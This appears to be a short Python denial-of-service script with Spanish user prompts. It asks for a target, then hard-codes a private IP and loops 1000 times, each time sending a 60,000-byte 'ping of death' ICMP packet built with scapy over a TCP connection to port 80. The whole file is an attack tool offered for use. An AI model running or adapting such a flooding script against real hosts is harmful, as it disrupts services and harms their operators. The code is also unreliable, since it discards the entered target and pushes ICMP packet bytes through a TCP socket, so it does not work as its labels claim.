import socket,  sys 
from scapy.layers.inet import * 
import colorama
from colorama import Fore
from colorama import Style
colorama.init()
#msg="hola"
#mensaje=bytes((msg),encoding='utf8')*6000

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip_addres=input("Introduzca la direccion IP o el nombre de host del objetivo:")
    #host=socket.gethostbyname(ip_addres)

    host='192.168.225.230'
    estado = sock.connect_ex((host,80))
    if estado==0:
            print(Fore.BLUE+"Conexion probada=OK"+Style.RESET_ALL)
            pass
    else:
            print(Fore.RED+"Error - No se pudo conectar al host."+Style.RESET_ALL)
            sys.exit()
    
except socket.error:
    print(Fore.RED+"Error - No se pudo conectar al servidor"+Style.RESET_ALL)
    sys.exit()
def dos_bomber():
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    pingOFDeath = bytes(IP(dst=host)/ICMP()/("T"*60000))
    
    try:
        dos.connect((host, 80))
        dos.send(pingOFDeath )
        dos.sendto(pingOFDeath, (host, 80) )
        dos.send(pingOFDeath)
    except socket.error:
        print ("|[Failed]...[!error] ...|".center(40))
        sys.exit()
    print ("[Attacking ]" + host.center(40))
    dos.close()
for i in range(1000):
    dos_bomber()